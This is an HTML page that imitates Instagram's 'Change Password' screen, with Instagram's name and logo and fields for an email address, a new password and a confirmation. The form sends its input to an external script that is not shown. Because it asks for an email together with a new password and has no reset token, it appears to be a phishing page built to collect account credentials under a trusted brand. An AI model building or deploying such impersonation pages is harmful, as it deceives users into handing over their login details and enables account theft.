<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password • Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <div class="form-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
            </div>
            
            <h3>Create a strong password</h3>
            <p class="description">Your password must be at least 6 characters and should include a combination of numbers, letters and special characters (!$@%).</p>

            <form id="resetForm">
                <div class="input-group">
                    <input type="email" id="emailAddress" placeholder="Email address" required>
                </div>
                
                <div class="input-group">
                    <input type="password" id="newPassword" placeholder="New password" required>
                    <button type="button" class="toggle-password" onclick="togglePass('newPassword')">Show</button>
                </div>
                
                <div class="input-group">
                    <input type="password" id="confirmPassword" placeholder="New password confirmation" required>
                    <button type="button" class="toggle-password" onclick="togglePass('confirmPassword')">Show</button>
                </div>

                <button type="submit" class="submit-btn">Reset Password</button>
            </form>
        </div>
        
        <div class="footer-box">
            <p>Back to <a href="#">Login</a></p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
